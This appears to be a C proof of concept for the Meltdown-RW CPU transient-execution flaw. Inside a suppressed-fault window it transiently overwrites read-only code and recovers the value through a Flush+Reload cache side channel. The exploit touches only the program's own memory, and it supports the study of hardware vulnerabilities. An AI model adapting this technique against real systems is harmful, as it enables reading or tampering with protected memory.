#define _GNU_SOURCE
#include <memory.h>
#include <stdio.h>
#include <stdlib.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <unistd.h>
#include <sys/prctl.h>

#include "libcache/cacheutils.h"

#define SECRET 'S'

void function() {
  asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
  asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
  asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
  asm volatile(".byte 'R','R','R','R','R','R','R','R','R','R','R','R','R','R','R','R'\n");
}

int main(void) {
  pagesize = sysconf(_SC_PAGESIZE);
  mem = (char*) malloc( pagesize * 256 );
  memset(mem, 1, pagesize * 256);
  
  // Detect cache threshold
  if(!CACHE_MISS)
    CACHE_MISS = detect_flush_reload_threshold();
  printf("[\x1b[33m*\x1b[0m] Flush+Reload Threshold: \x1b[33m%zd\x1b[0m\n", CACHE_MISS);

  // Flush our shared memory
  flush_shared_memory();

  printf("Output legend:\n");
  printf("  'R'.....Read old value\n");
  printf("  '%c'.....Read new value\n\n", (char)SECRET);

  for(int r = 0; r < 1000000; r++) {
    if(try_start()) {
      //Null pointer access prolongs transient window
      maccess(0);
      //overwrite read-only data
      (*((char*)((size_t)function + 32))) = SECRET;
      //access shared memory based on overwritten value
      maccess(mem + *((char*)((size_t)function + 32)) * pagesize);

      try_abort();
    }
    try_end();

    //Recover data from cache covert channel
    for(int i = 0; i < 256; i++) {
      int mix_i = ((i * 167) + 13) % 256;
      if(flush_reload(mem + mix_i * pagesize)) {
        printf("%c ", mix_i);
        fflush(stdout);
      }
    }
  }

  printf("Meltdown-RW done!\n");
  free(mem);

  return EXIT_SUCCESS;
}

